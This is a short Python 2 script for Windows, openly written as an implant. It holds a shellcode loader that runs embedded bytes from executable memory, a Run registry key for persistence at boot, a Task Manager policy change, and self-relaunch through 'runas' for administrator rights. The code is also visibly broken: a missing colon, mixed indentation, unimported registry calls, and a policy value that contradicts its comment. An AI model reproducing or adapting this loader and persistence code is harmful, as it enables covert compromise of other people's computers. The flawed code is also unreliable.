import os
import sys
import ctypes
import os.path
import _winreg
import pythoncom
import pywintypes
import win32api
import win32com.shell.shell as shell

# Main function.
def execute()
    # Download file to path and execute (shellcode example) 
    shellcode = bytearray(
	"\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
	"\xb1\x33\x31\x77\x17\x83\xc7\x04\x03\x9f\x49\xc5\xe6\xa3" 
	"\x86\x80\x09\x5b\x57\xf3\x80\xbe\x66\x21\xf6\xcb\xdb\xf5" 
	"\x7c\x99\xd7\x7e\xd0\x09\x63\xf2\xfd\x3e\xc4\xb9\xdb\x71" 
	"\xd5\x0f\xe4\xdd\x15\x11\x98\x1f\x4a\xf1\xa1\xd0\x9f\xf0" 
	"\xe6\x0c\x6f\xa0\xbf\x5b\xc2\x55\xcb\x19\xdf\x54\x1b\x16" 
	"\x5f\x2f\x1e\xe8\x14\x85\x21\x38\x84\x92\x6a\xa0\xae\xfd" 
	"\x4a\xd1\x63\x1e\xb6\x98\x08\xd5\x4c\x1b\xd9\x27\xac\x2a" 
	"\x25\xeb\x93\x83\xa8\xf5\xd4\x23\x53\x80\x2e\x50\xee\x93" 
	"\xf4\x2b\x34\x11\xe9\x8b\xbf\x81\xc9\x2a\x13\x57\x99\x20" 
	"\xd8\x13\xc5\x24\xdf\xf0\x7d\x50\x54\xf7\x51\xd1\x2e\xdc" 
	"\x75\xba\xf5\x7d\x2f\x66\x5b\x81\x2f\xce\x04\x27\x3b\xfc" 
	"\x51\x51\x66\x6a\xa7\xd3\x1c\xd3\xa7\xeb\x1e\x73\xc0\xda" 
	"\x95\x1c\x97\xe2\x7f\x59\x67\xa9\x22\xcb\xe0\x74\xb7\x4e" 
	"\x6d\x87\x6d\x8c\x88\x04\x84\x6c\x6f\x14\xed\x69\x2b\x92" 
	"\x1d\x03\x24\x77\x22\xb0\x45\x52\x41\x57\xd6\x3e\xa8\xf2" 
	"\x5e\xa4\xb4")
 
	ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
					ctypes.c_int(len(shellcode)),
					ctypes.c_int(0x3000),
					ctypes.c_int(0x40))
	
	buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
	
	ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
					buf,
					ctypes.c_int(len(shellcode)))
	
	ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
						ctypes.c_int(0),
						ctypes.c_int(ptr),
						ctypes.c_int(0),
						ctypes.c_int(0),
						ctypes.pointer(ctypes.c_int(0)))
	
	ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
	
	# Reg key to run implant at boot
	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE)
	SetValueEx(aKey,"foobar",1, REG_SZ, PATH)
	CloseKey(aKey)
	
	# Disable task manager for good measure
	aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE)
	SetValueEx(aKey,"DisableTaskMgr",1, REG_DWORD, 0)
	CloseKey(aKey)


if not shell.IsUserAnAdmin():
	# Elevate privilege  
	ASADMIN = "asadmin"

	if sys.argv[-1] != ASADMIN:
    		script = os.path.abspath(sys.argv[0])
    		params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    		shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    		sys.exit(0)

PATH = "C:\\SomeDir\\example\\implant.exe" 

if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
    sys.exit(0)
else:
    execute()
